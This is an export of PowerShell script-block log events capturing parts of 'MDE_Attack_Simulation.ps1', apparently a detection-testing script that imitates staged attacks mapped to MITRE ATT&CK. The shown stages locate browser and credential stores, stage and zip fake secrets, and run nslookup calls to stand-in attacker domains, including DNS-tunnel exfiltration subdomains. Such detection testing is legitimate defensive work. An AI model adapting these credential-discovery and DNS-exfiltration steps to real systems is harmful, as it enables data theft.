            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('PolicyStore')) {
          [object]$__cmdletization_value = ${PolicyStore}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:PolicyStore'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:PolicyStore'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('GPOSession')) {
          [object]$__cmdletization_value = ${GPOSession}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:GPOSession'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:GPOSession'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Name')) {
          [object]$__cmdletization_value = ${Name}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InstanceID'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InstanceID'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisplayName')) {
          [object]$__cmdletization_value = ${DisplayName}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ElementName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ElementName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('RulePriority')) {
          [object]$__cmdletization_value = ${RulePriority}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RulePriority'; ParameterType = 'System.UInt16'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RulePriority'; ParameterType = 'System.UInt16'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Direction')) {
          [object]$__cmdletization_value = ${Direction}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Direction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Direction'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Direction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Direction'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('VMCreatorId')) {
          [object]$__cmdletization_value = ${VMCreatorId}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'VMCreatorId'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'VMCreatorId'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Protocol')) {
          [object]$__cmdletization_value = ${Protocol}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Protocol'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Protocol'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('LocalAddresses')) {
          [object]$__cmdletization_value = ${LocalAddresses}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LocalAddresses'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LocalAddresses'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('LocalPorts')) {
          [object]$__cmdletization_value = ${LocalPorts}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LocalPorts'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LocalPorts'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('RemoteAddresses')) {
          [object]$__cmdletization_value = ${RemoteAddresses}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteAddresses'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteAddresses'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('RemotePorts')) {
          [object]$__cmdletization_value = ${RemotePorts}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemotePorts'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemotePorts'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Action')) {
          [object]$__cmdletization_value = ${Action}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Action'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Action'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Action'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Action'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Enabled')) {
          [object]$__cmdletization_value = ${Enabled}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Enabled'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Enabled'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Enabled'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Enabled'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Profiles')) {
          [object]$__cmdletization_value = ${Profiles}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Profiles'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Profile'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Profiles'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Profile'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('PortStatuses')) {
          [object]$__cmdletization_value = ${PortStatuses}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PortStatuses'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PortStatuses'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = $null
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:CreateInstance', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)

            }
        }
        catch
        {
            $__cmd

ScriptBlock ID: 09608154-cddc-467f-b671-dde3ed1657ff
Path: "
"07-08-2025 18:27:33","4104","Warning","Creating Scriptblock text (4 of 4):

        }
        
        MITRETechniques = @{
            TotalTechniques = 45
            Tactics = @{
                InitialAccess = @(""T1059.001"", ""T1106"")
                Execution = @(""T1059.001"", ""T1106"", ""T1047"", ""T1218"")
                Persistence = @(""T1547.001"", ""T1053.005"", ""T1546.003"", ""T1574.001"", ""T1547.009"", ""T1137"")
                PrivilegeEscalation = @(""T1055"", ""T1055.001"", ""T1055.002"", ""T1055.003"", ""T1055.004"", ""T1055.012"")
                DefenseEvasion = @(""T1562.001"", ""T1564.003"", ""T1027.010"", ""T1140"", ""T1027"", ""T1218"")
                CredentialAccess = @(""T1003.001"", ""T1003.003"", ""T1555"")
                Discovery = @(""T1087"", ""T1083"", ""T1069"", ""T1016"", ""T1007"", ""T1012"", ""T1057"")
                LateralMovement = @(""T1021.001"", ""T1021.002"", ""T1021.006"")
                Collection = @(""T1074.001"", ""T1005"", ""T1560.001"", ""T1119"")
                CommandAndControl = @(""T1041"")
                Exfiltration = @(""T1041"", ""T1048.001"", ""T1048.003"", ""T1567"")
                Impact = @(""T1486"", ""T1490"", ""T1070"", ""T1070.001"", ""T1070.004"", ""T1489"")
            }
        }
        
        AlertTriggers = $script:MDEAlertTriggers
        
        SecurityRecommendations = @(
            ""Review all PowerShell execution logs"",
            ""Check for unauthorized scheduled tasks"",
            ""Investigate WMI event subscriptions"",
            ""Analyze process injection attempts"",
            ""Review credential access attempts"",
            ""Check for data staging and exfiltration"",
            ""Investigate persistence mechanisms"",
            ""Review anti-forensic activities""
        )
    }
    
    $alertReport | ConvertTo-Json -Depth 5 | Out-File $script:MDECorrelationLog
    
    # Generate HTML report for easy viewing
    $htmlReport = @""
<!DOCTYPE html>
<html>
<head>
    <title>MDE Alert Simulation Report</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #f0f0f0; }
        .header { background: #0078d4; color: white; padding: 20px; border-radius: 5px; }
        .section { background: white; margin: 20px 0; padding: 20px; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        .critical { color: #d83b01; font-weight: bold; }
        .high { color: #e97548; font-weight: bold; }
        .medium { color: #ffb900; }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 10px; text-align: left; border-bottom: 1px solid #ddd; }
        th { background: #f0f0f0; }
    </style>
</head>
<body>
    <div class=""header"">
        <h1>MDE Advanced Attack Simulation Report</h1>
        <p>Simulation ID: $($script:AttackID)</p>
        <p>Host: $env:COMPUTERNAME | Time: $(Get-Date -Format ""yyyy-MM-dd HH:mm:ss"")</p>
    </div>
    
    <div class=""section"">
        <h2>Expected MDE Alerts</h2>
        <h3 class=""critical"">Critical Severity</h3>
        <ul>
            $(($alertReport.ExpectedMDEAlerts.Critical | ForEach-Object { ""<li>$_</li>"" }) -join ""`n"")
        </ul>
        <h3 class=""high"">High Severity</h3>
        <ul>
            $(($alertReport.ExpectedMDEAlerts.High | ForEach-Object { ""<li>$_</li>"" }) -join ""`n"")
        </ul>
        <h3 class=""medium"">Medium Severity</h3>
        <ul>
            $(($alertReport.ExpectedMDEAlerts.Medium | ForEach-Object { ""<li>$_</li>"" }) -join ""`n"")
        </ul>
    </div>
    
    <div class=""section"">
        <h2>MITRE ATT&CK Coverage</h2>
        <p>Total Techniques: $($alertReport.MITRETechniques.TotalTechniques)</p>
        <p>Tactics Covered: $($alertReport.MITRETechniques.Tactics.Keys.Count)</p>
    </div>
    
    <div class=""section"">
        <h2>Next Steps</h2>
        <ol>
            <li>Check security.microsoft.com for generated alerts</li>
            <li>Review incident timeline in MDE portal</li>
            <li>Analyze automated investigation results</li>
            <li>Document detection gaps if any</li>
        </ol>
    </div>
</body>
</html>
""@
    
    $htmlReport | Out-File ""$TargetPath\MDE_Alert_Report.html""
    
    Write-Host ""`n??????????????????????????????????????????????????????????????????"" -ForegroundColor Green
    Write-Host ""?           MDE ALERT GENERATION COMPLETE                       ?"" -ForegroundColor Green  
    Write-Host ""??????????????????????????????????????????????????????????????????"" -ForegroundColor Green
    Write-Host ""`nExpected Alerts in security.microsoft.com:"" -ForegroundColor Yellow
    Write-Host ""  - Critical: $($alertReport.ExpectedMDEAlerts.Critical.Count) alerts"" -ForegroundColor Red
    Write-Host ""  - High: $($alertReport.ExpectedMDEAlerts.High.Count) alerts"" -ForegroundColor Magenta
    Write-Host ""  - Medium: $($alertReport.ExpectedMDEAlerts.Medium.Count) alerts"" -ForegroundColor Yellow
    Write-Host ""`nSimulation ID for correlation: $script:AttackID"" -ForegroundColor Cyan
    Write-Host ""HTML Report: $TargetPath\MDE_Alert_Report.html"" -ForegroundColor Cyan
}

# ============================================
# Main Execution Flow
# ============================================
function Start-AdvancedAttackSimulation {
    $script:AttackStartTime = Get-Date
    
    Write-Host ""`n??????????????????????????????????????????????????????????????????"" -ForegroundColor Red
    Write-Host ""?       ADVANCED MDE ATTACK SIMULATION v3.0 STARTING            ?"" -ForegroundColor Red
    Write-Host ""?         Real-time alerts will appear in MDE portal            ?"" -ForegroundColor Red
    Write-Host ""??????????????????????????????????????????????????????????????????"" -ForegroundColor Red
    Write-Host ""`n""
    
    Write-MDELog ""Advanced attack simulation initiated"" ""INFO""
    Write-MDELog ""Target path: $TargetPath"" ""INFO""
    Write-MDELog ""Attack ID: $script:AttackID"" ""INFO""
    
    try {
        # Execute all stages with delays for MDE processing
        Invoke-Stage0Setup
        Start-Sleep -Seconds $DelayBetweenStages
        
        Invoke-Stage1AdvancedAccess
        Start-Sleep -Seconds $DelayBetweenStages
        
        Invoke-Stage2SophisticatedPersistence
        Start-Sleep -Seconds $DelayBetweenStages
        
        Invoke-Stage3AdvancedEvasion
        Start-Sleep -Seconds $DelayBetweenStages
        
        Invoke-Stage4AdvancedDiscovery
        Start-Sleep -Seconds $DelayBetweenStages
        
        Invoke-Stage5LateralMovement
        Start-Sleep -Seconds $DelayBetweenStages
        
        Invoke-Stage6AdvancedCollection
        Start-Sleep -Seconds $DelayBetweenStages
        
        Invoke-Stage7DataExfiltration
        Start-Sleep -Seconds $DelayBetweenStages
        
        Invoke-Stage8Impact
        
        # Generate comprehensive report
        Generate-MDEAlertReport
        
        Write-MDELog ""Attack simulation completed successfully"" ""INFO""
        
        # Display summary
        $duration = ((Get-Date) - $script:AttackStartTime).TotalMinutes
        Write-Host ""`nSimulation Duration: $([Math]::Round($duration, 2)) minutes"" -ForegroundColor Green
        Write-Host ""Total Alert Triggers: $($script:MDEAlertTriggers.Count)"" -ForegroundColor Yellow
        Write-Host ""Artifacts Generated: $((Get-ChildItem $TargetPath -Recurse -File).Count) files"" -ForegroundColor Cyan
        
    } catch {
        Write-MDELog ""Error during simulation: $_"" ""ERROR""
        Write-Host ""Simulation encountered an error: $_"" -ForegroundColor Red
    }
    
    # Cleanup if not skipped
    if (-not $SkipCleanup) {
        Write-Host ""`nCleaning up persistence mechanisms..."" -ForegroundColor Yellow
        
        # Remove registry keys
        $regCleanup = @(
            ""HKCU:\Software\Classes\TestMDESimulation"",
            ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\MDESimulation_*""
        )
        
        foreach ($reg in $regCleanup) {
            Remove-Item -Path $reg -Recurse -Force -ErrorAction SilentlyContinue
        }
        
        # Remove scheduled tasks
        Get-ScheduledTask -TaskName ""MDE_*"" -ErrorAction SilentlyContinue | 
            Unregister-ScheduledTask -Confirm:$false
        
        # Remove startup shortcuts
        Remove-Item ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\MDETest.lnk"" -Force -ErrorAction SilentlyContinue
        
        Write-Host ""Cleanup completed"" -ForegroundColor Green
    } else {
        Write-Host ""`nSkipping cleanup - artifacts preserved for investigation"" -ForegroundColor Yellow
    }
    
    Write-Host ""`n????????????????????????????????????????????????????????????????"" -ForegroundColor Cyan
    Write-Host ""  CHECK security.microsoft.com FOR GENERATED ALERTS"" -ForegroundColor Yellow
    Write-Host ""  Simulation ID: $script:AttackID"" -ForegroundColor Cyan
    Write-Host ""????????????????????????????????????????????????????????????????"" -ForegroundColor Cyan
}

# Execute the simulation
Start-AdvancedAttackSimulation

ScriptBlock ID: 7079c0a7-864c-4409-8206-1982720c61a3
Path: C:\Simulation_Scripts\MDE_Attack_Simulation.ps1"
"07-08-2025 18:27:33","4104","Warning","Creating Scriptblock text (3 of 4):
$trustedHosts) {
            $winrmTest.TrustedHosts = $trustedHosts.Value
        }
    } catch {
        Write-MDELog ""WinRM enumeration limited"" ""INFO""
    }
    
    $winrmTest | ConvertTo-Json | Out-File ""$TargetPath\winrm_configuration.json""
    
    # T1021.001 - Remote Desktop Protocol
    Write-MDELog ""Checking RDP configuration"" ""ATTACK"" -Technique ""T1021.001"" -Severity 3
    
    $rdpConfig = @{
        RDPEnabled = (Get-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name ""fDenyTSConnections"" -ErrorAction SilentlyContinue).fDenyTSConnections
        Port = 3389
        NLA = (Get-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name ""UserAuthentication"" -ErrorAction SilentlyContinue).UserAuthentication
    }
    
    $rdpConfig | ConvertTo-Json | Out-File ""$TargetPath\rdp_configuration.json""
    
    # T1047 - Windows Management Instrumentation
    Write-MDELog ""Testing WMI for lateral movement"" ""ATTACK"" -Technique ""T1047"" -Severity 4
    
    # WMI query simulation
    $wmiQueries = @(
        ""SELECT * FROM Win32_Process WHERE Name = 'powershell.exe'"",
        ""SELECT * FROM Win32_Service WHERE State = 'Running'"",
        ""SELECT * FROM Win32_StartupCommand""
    )
    
    foreach ($query in $wmiQueries) {
        Write-MDELog ""WMI Query: $query"" ""ATTACK""
        
        @{
            Query = $query
            Timestamp = Get-Date -Format ""o""
            Results = ""Simulated""
        } | ConvertTo-Json | Out-File ""$TargetPath\wmi_query_$(Get-Random).json""
    }
}

# ============================================
# STAGE 6: Advanced Collection & Staging
# ============================================
function Invoke-Stage6AdvancedCollection {
    Write-MDELog ""=== STAGE 6: Advanced Collection & Staging ==="" ""EXFIL"" -Technique ""T1074"" -Severity 4
    
    # T1074.001 - Data Staged: Local Data Staging
    Write-MDELog ""Creating local staging directory"" ""EXFIL"" -Technique ""T1074.001"" -Severity 3
    
    $stagingPath = ""$TargetPath\staged_data_$($script:AttackID.Substring(0,8))""
    New-Item -Path $stagingPath -ItemType Directory -Force | Out-Null
    
    # T1005 - Data from Local System
    Write-MDELog ""Collecting data from local system"" ""EXFIL"" -Technique ""T1005"" -Severity 3
    
    $dataToCollect = @{
        Documents = @()
        Credentials = @()
        Configurations = @()
        BrowserData = @()
    }
    
    # Simulate document collection
    $docTypes = @(""*.docx"", ""*.xlsx"", ""*.pdf"", ""*.pptx"")
    foreach ($docType in $docTypes) {
        $docs = Get-ChildItem -Path $env:USERPROFILE\Documents -Filter $docType -ErrorAction SilentlyContinue | Select-Object -First 3
        if ($docs) {
            $dataToCollect.Documents += $docs.FullName
        }
    }
    
    # T1555 - Credentials from Password Stores
    Write-MDELog ""Searching for credential stores"" ""EXFIL"" -Technique ""T1555"" -Severity 4
    
    $credentialStores = @(
        ""$env:APPDATA\Microsoft\Credentials"",
        ""$env:LOCALAPPDATA\Google\Chrome\User Data\Default"",
        ""$env:APPDATA\Mozilla\Firefox\Profiles"",
        ""$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default""
    )
    
    foreach ($store in $credentialStores) {
        if (Test-Path $store) {
            $dataToCollect.Credentials += $store
            Write-MDELog ""Found credential store: $store"" ""EXFIL""
        }
    }
    
    $dataToCollect | ConvertTo-Json | Out-File ""$stagingPath\collection_manifest.json""
    
    # T1560.001 - Archive via Zip
    Write-MDELog ""Creating compressed archive for exfiltration"" ""EXFIL"" -Technique ""T1560.001"" -Severity 3
    
    # Create fake sensitive files
    $fakeData = @{
        ""financial_data.csv"" = ""Date,Amount,Account`n2024-01-01,10000,ACC001`n2024-01-02,25000,ACC002""
        ""passwords.txt"" = ""Username:Password`nadmin:P@ssw0rd123`nuser1:Secret456""
        ""api_keys.json"" = '{""api_key"":""sk-1234567890abcdef"",""secret"":""AKIA1234567890""}'
        ""database.sql"" = ""SELECT * FROM users WHERE admin = 1; -- sensitive query""
        ""private_key.pem"" = ""-----BEGIN RSA PRIVATE KEY-----`nMIIEowIBAAKCAQEA1234567890`n-----END RSA PRIVATE KEY-----""
    }
    
    foreach ($file in $fakeData.Keys) {
        $fakeData[$file] | Out-File ""$stagingPath\$file""
    }
    
    # Create multiple archive formats
    Write-MDELog ""Creating multiple archive formats"" ""EXFIL""
    
    # ZIP archive
    Compress-Archive -Path $stagingPath -DestinationPath ""$TargetPath\exfil_data.zip"" -Force
    
    # Create a CAB file marker
    ""MSCF`u{0}`u{0}`u{0}`u{0}"" | Out-File ""$TargetPath\exfil_data.cab"" -Encoding ASCII
    
    # Create a RAR file marker
    ""Rar!`u{1a}`u{7}`u{0}"" | Out-File ""$TargetPath\exfil_data.rar"" -Encoding ASCII
    
    # T1119 - Automated Collection
    Write-MDELog ""Simulating automated collection script"" ""EXFIL"" -Technique ""T1119"" -Severity 3
    
    $collectionScript = @'
# Automated Collection Script
$targets = @(""Documents"", ""Desktop"", ""Downloads"", ""Pictures"")
$output = @{}
foreach ($target in $targets) {
    $path = ""$env:USERPROFILE\$target""
    $output[$target] = Get-ChildItem -Path $path -Recurse -File | Select-Object Name, Length, LastWriteTime
}
$output | ConvertTo-Json | Out-File ""collection_results.json""
'@
    
    $collectionScript | Out-File ""$stagingPath\collection_script.ps1""
}

# ============================================
# STAGE 7: Data Exfiltration Simulation
# ============================================
function Invoke-Stage7DataExfiltration {
    Write-MDELog ""=== STAGE 7: Data Exfiltration Simulation ==="" ""EXFIL"" -Technique ""T1041"" -Severity 5
    
    # T1041 - Exfiltration Over C2 Channel
    Write-MDELog ""Simulating C2 channel exfiltration"" ""EXFIL"" -Technique ""T1041"" -Severity 5
    
    $c2Servers = @(
        ""https://evil-c2-server.com/upload"",
        ""https://malicious-callback.net/data"",
        ""https://attacker-controlled.org/exfil""
    )
    
    foreach ($c2 in $c2Servers) {
        Write-MDELog ""Simulating exfiltration to: $c2"" ""EXFIL""
        
        # DNS lookup to trigger MDE
        $domain = ([System.Uri]$c2).Host
        nslookup $domain 2>&1 | Out-Null
        
        @{
            Destination = $c2
            Method = ""POST""
            DataSize = (Get-Item ""$TargetPath\exfil_data.zip"" -ErrorAction SilentlyContinue).Length
            Timestamp = Get-Date -Format ""o""
        } | ConvertTo-Json | Out-File ""$TargetPath\c2_exfil_$(Get-Random).json""
    }
    
    # T1048.003 - Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol
    Write-MDELog ""Testing alternative exfiltration methods"" ""EXFIL"" -Technique ""T1048.003"" -Severity 4
    
    # DNS Exfiltration
    Write-MDELog ""Simulating DNS exfiltration"" ""EXFIL""
    
    $dnsData = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(""Exfiltrated_Data_$script:AttackID""))
    $chunks = $dnsData -split '(.{30})' | Where-Object { $_ }
    
    foreach ($i in 0..([Math]::Min($chunks.Count, 5) - 1)) {
        $subdomain = ""$($chunks[$i]).dns-tunnel-$i.evil-dns.com""
        Write-MDELog ""DNS exfil query: $subdomain"" ""EXFIL""
        nslookup $subdomain 2>&1 | Out-Null
        Start-Sleep -Milliseconds 200
    }
    
    # T1567 - Exfiltration to Cloud Storage
    Write-MDELog ""Simulating cloud storage exfiltration"" ""EXFIL"" -Technique ""T1567"" -Severity 4
    
    $cloudServices = @(
        @{Service = ""Dropbox""; URL = ""https://content.dropboxapi.com/2/files/upload""},
        @{Service = ""OneDrive""; URL = ""https://api.onedrive.com/v1.0/drive/items/root:/exfil.zip:/content""},
        @{Service = ""GoogleDrive""; URL = ""https://www.googleapis.com/upload/drive/v3/files""},
        @{Service = ""AWS S3""; URL = ""https://evil-bucket.s3.amazonaws.com/exfil.zip""}
    )
    
    foreach ($cloud in $cloudServices) {
        Write-MDELog ""Cloud exfiltration simulation: $($cloud.Service)"" ""EXFIL""
        
        @{
            Service = $cloud.Service
            URL = $cloud.URL
            Method = ""PUT""
            Timestamp = Get-Date -Format ""o""
        } | ConvertTo-Json | Out-File ""$TargetPath\cloud_exfil_$($cloud.Service).json""
    }
    
    # T1048.001 - Exfiltration Over Alternative Protocol - Symmetric Encryption
    Write-MDELog ""Creating encrypted exfiltration channel"" ""EXFIL"" -Technique ""T1048.001"" -Severity 4
    
    # AES encryption simulation
    $rng = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
    $aesKey = New-Object byte[] 32
    $aesIV = New-Object byte[] 16
